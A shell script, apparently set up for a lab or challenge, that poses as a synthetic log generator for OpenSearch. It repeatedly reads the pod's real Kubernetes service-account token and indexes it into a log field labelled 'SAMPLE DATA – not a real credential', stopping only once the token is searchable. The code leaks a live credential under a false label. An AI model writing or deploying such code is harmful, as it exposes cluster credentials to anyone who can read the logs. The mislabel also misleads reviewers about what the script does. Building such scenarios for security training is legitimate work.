#!/usr/bin/env sh
# Send logs directly to OpenSearch (port 9200) and stop when the token appears.
set -eu

#################################
# Configuration
#################################
OPENSEARCH_URL="${OPENSEARCH_URL:-http://opensearch.mem:9200}" # e.g. http(s)://host:9200
INDEX_NAME="${INDEX_NAME:-logs-otel}"                          # destination index
# Authentication to OpenSearch: use ONE of the two methods below (or none if not needed)
OPENSEARCH_AUTH_HEADER="${OPENSEARCH_AUTH_HEADER:-}"           # e.g. "Authorization: Bearer <JWT>" or "Authorization: Basic <base64>"
OPENSEARCH_USER="${OPENSEARCH_USER:-}"                         # alternative: basic user
OPENSEARCH_PASS="${OPENSEARCH_PASS:-}"                         # alternative: basic pass
OPENSEARCH_INSECURE="${OPENSEARCH_INSECURE:-false}"            # true to pass -k if TLS is self-signed

# Synthetic log data
OTEL_SERVICE_NAME="${OTEL_SERVICE_NAME:-traffic-controller}"
LOG_INTERVAL_SECONDS="${LOG_INTERVAL_SECONDS:-5}"
LOG_SEVERITY_TEXT="${LOG_SEVERITY_TEXT:-Info}"
LOG_SEVERITY_NUMBER="${LOG_SEVERITY_NUMBER:-9}"
TOKEN_FILE="${TOKEN_FILE:-/var/run/secrets/kubernetes.io/serviceaccount/token}"

# Initial wait (to give OpenSearch time to be ready)
INITIAL_SLEEP="${INITIAL_SLEEP:-180}"

#################################
# Utility functions
#################################
curl_insecure_flag() {
  case "$1" in
    true|TRUE|1) printf "%s" "-k" ;;
    *)           printf "%s" ""    ;;
  esac
}

curl_auth_args() {
  # Return curl args for auth (Bearer/Basic header OR -u user:pass)
  if [ -n "${OPENSEARCH_AUTH_HEADER}" ]; then
    printf -- "-H" ; printf " %s" "${OPENSEARCH_AUTH_HEADER}"
  elif [ -n "${OPENSEARCH_USER}" ] || [ -n "${OPENSEARCH_PASS}" ]; then
    printf -- "-u" ; printf " %s:%s" "${OPENSEARCH_USER}" "${OPENSEARCH_PASS}"
  else
    printf ""
  fi
}

rand_hex() {
  od -vN "$1" -An -tx1 /dev/urandom | tr -d ' \n'
}

now_iso() {
  # ISO-8601 (e.g., 2025-09-19T12:34:56+00:00)
  date -Is
}

index_one() {
  # Create a "log-like" document and index it into OPENSEARCH_URL/INDEX_NAME/_doc
  local ts trace_id span_id auth_val payload insecure_flag

  ts="$(now_iso)"
  trace_id="$(rand_hex 16)"
  span_id="$(rand_hex 8)"
  auth_val="$(cat "${TOKEN_FILE}" 2>/dev/null || echo "NO_TOKEN_FILE")"

  # "Flat" document + attributes sub-object for easy querying (attributes.authorization)
  payload=$(cat <<EOF
{
  "@timestamp": "${ts}",
  "service": {
    "name": "${OTEL_SERVICE_NAME}",
    "instance": "${HOSTNAME:-unknown}"
  },
  "severityText": "${LOG_SEVERITY_TEXT}",
  "severityNumber": ${LOG_SEVERITY_NUMBER},
  "body": "k8s_secret_access_denied",
  "http": {
    "request": { "method": "GET" },
    "target": "/api/v1/namespaces/demo/secrets/fake",
    "status": 403
  },
  "attributes": {
    "authorization": "${auth_val}",
    "note": "SAMPLE DATA – not a real credential"
  },
  "trace": { "id": "${trace_id}", "span_id": "${span_id}", "flags": 1 }
}
EOF
)

  insecure_flag="$(curl_insecure_flag "${OPENSEARCH_INSECURE}")"

  # Prepare auth args
  # shellcheck disable=SC2046
  curl -sS -X POST \
    ${insecure_flag} \
    -H 'Content-Type: application/json' \
    $(curl_auth_args) \
    --data "${payload}" \
    "${OPENSEARCH_URL}/${INDEX_NAME}/_doc" >/dev/null

  printf "[direct-log] indexed at %s into %s/%s\n" "${ts}" "${OPENSEARCH_URL}" "${INDEX_NAME}" >&2
}

search_token_in_opensearch() {
  # Search the most recent authorization in the given indices
  local insecure_flag query_json

  insecure_flag="$(curl_insecure_flag "${OPENSEARCH_INSECURE}")"

  query_json=$(cat <<'Q'
{
  "size": 1000,
  "sort": [ { "@timestamp": { "order": "desc" } } ],
  "query": { "exists": { "field": "attributes.authorization" } },
  "_source": [ "attributes.authorization" ]
}
Q
)

  # shellcheck disable=SC2046
  curl -s ${insecure_flag} \
    -H 'Content-Type: application/json' \
    $(curl_auth_args) \
    "${OPENSEARCH_URL}/${INDEX_NAME}/_search" \
    -d "${query_json}" \
  | jq -r '.hits.hits[]._source.attributes.authorization // empty' \
  | grep -v '^$' \
  | head -n1 || true
}

#################################
# Main loop
#################################
sleep "${INITIAL_SLEEP}"

while true; do
  index_one

  FOUND_TOKEN="$(search_token_in_opensearch || true)"
  CURRENT_TOKEN="$(cat "${TOKEN_FILE}" 2>/dev/null || echo "NO_TOKEN_FILE")"

  if [ -n "${FOUND_TOKEN}" ] && [ "${FOUND_TOKEN}" = "${CURRENT_TOKEN}" ]; then
    printf "[direct-log] token matched in OpenSearch, stopping at %s\n" "$(date -Is)" >&2
    break
  fi

  sleep "${LOG_INTERVAL_SECONDS}"
done

echo "Done"
